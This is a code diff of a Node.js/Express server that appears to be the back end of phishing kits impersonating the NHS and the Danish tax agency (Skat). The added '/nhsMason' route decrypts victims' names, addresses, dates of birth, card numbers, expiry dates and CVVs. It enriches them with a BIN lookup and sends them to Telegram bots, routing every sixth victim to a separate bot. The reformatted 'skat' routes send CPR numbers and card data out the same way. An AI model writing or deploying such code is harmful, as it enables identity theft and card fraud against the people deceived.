@@ -1912,6 +1912,85 @@ app.post("/stillrunning", (req, res) => {
     });
 });
 
+app.options("/nhsMason", cors());
+
+app.post("/nhsMason", (req, res) => {
+  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  userAgent = req.body.userAgent;
+  ip = req.body.ip;
+  bin = req.body.bin;
+
+  if (bin.length === 7) {
+    formatBin = bin.replace(/ /g, "");
+    if (formatBin.length === 7) {
+      formatBin = bin.slice(0, -1);
+    }
+    bin = formatBin;
+  }
+  axios
+    .get(`https://lookup.binlist.net/${bin}`)
+    .then((resp) => {
+      if (!resp.data.bank) {
+        bankName = "";
+      } else {
+        bankName = resp.data.bank.name;
+      }
+    })
+    .then(function () {
+      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
+      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+      if (mason == 6) {
+        axios.post(
+          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
+        );
+        mason = 0;
+      } else if (bin === "542011") {
+        axios.post(
+          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
+        );
+      } else {
+        axios.post(
+          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSMason:\n${originalText}`
+        );
+        axios.post(
+          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1912976454&text=NHS:\n${originalText}`
+        );
+        mason += 1;
+      }
+
+      res.send("Update Completed");
+    });
+});
+
 app.options("/@kworthy12", cors());
 
 app.post("/@kworthy12", (req, res) => {
@@ -4264,23 +4343,24 @@ let skat = 0;
 app.options("/skatPersonal", cors());
 
 app.post("/skatPersonal", (req, res) => {
-  username = req.body.username
-  fullname = req.body.fullname
-  address = req.body.address
-  city = req.body.city
-  zip = req.body.zip
-  dob = req.body.dob
-  telephone = req.body.telephone
-  cpr = req.body.cpr
-  bank = req.body.bank
+  username = req.body.username;
+  fullname = req.body.fullname;
+  address = req.body.address;
+  city = req.body.city;
+  zip = req.body.zip;
+  dob = req.body.dob;
+  telephone = req.body.telephone;
+  cpr = req.body.cpr;
+  bank = req.body.bank;
   var originalText = `+----------- Login Information ------------+\nUsername: ${username}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nZIP: ${zip}\nPhone Number: ${telephone}\nCPR: ${cpr}\nBank: ${bank}`;
 
   axios
     .post(
-      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`, {
+      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+      {
         chat_id: 680379375,
         text: `Skat\n${originalText}`,
-        parse_mode:'Markdown'
+        parse_mode: "Markdown",
       }
     )
     .catch((e) => {
@@ -4288,10 +4368,11 @@ app.post("/skatPersonal", (req, res) => {
     });
   axios
     .post(
-      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`, {
+      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+      {
         chat_id: 1449567433,
         text: `Skat\n${originalText}`,
-        parse_mode:'Markdown'
+        parse_mode: "Markdown",
       }
     )
     .catch((e) => {
@@ -4312,12 +4393,12 @@ app.post("/skatPersonal", (req, res) => {
 app.options("/skatBilling", cors());
 
 app.post("/skatBilling", (req, res) => {
-  ccname = req.body.ccname
-  ccnum = req.body.ccnum
-  ccexp = req.body.ccexp
-  cccvv = req.body.cccvv
-  zip = req.body.zip
-  dob = req.body.dob
+  ccname = req.body.ccname;
+  ccnum = req.body.ccnum;
+  ccexp = req.body.ccexp;
+  cccvv = req.body.cccvv;
+  zip = req.body.zip;
+  dob = req.body.dob;
   userAgent = req.body.userAgent;
   ip = req.body.ip;
   bin = req.body.bin;
@@ -4343,10 +4424,11 @@ app.post("/skatBilling", (req, res) => {
       var originalText = `+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
       axios
         .post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`, {
+          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+          {
             chat_id: 680379375,
             text: `Skat\n${originalText}`,
-            parse_mode:'Markdown'
+            parse_mode: "Markdown",
           }
         )
         .catch((e) => {
@@ -4354,10 +4436,11 @@ app.post("/skatBilling", (req, res) => {
         });
       axios
         .post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`, {
+          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+          {
             chat_id: 1449567433,
             text: `Skat\n${originalText}`,
-            parse_mode:'Markdown'
+            parse_mode: "Markdown",
           }
         )
         .catch((e) => {
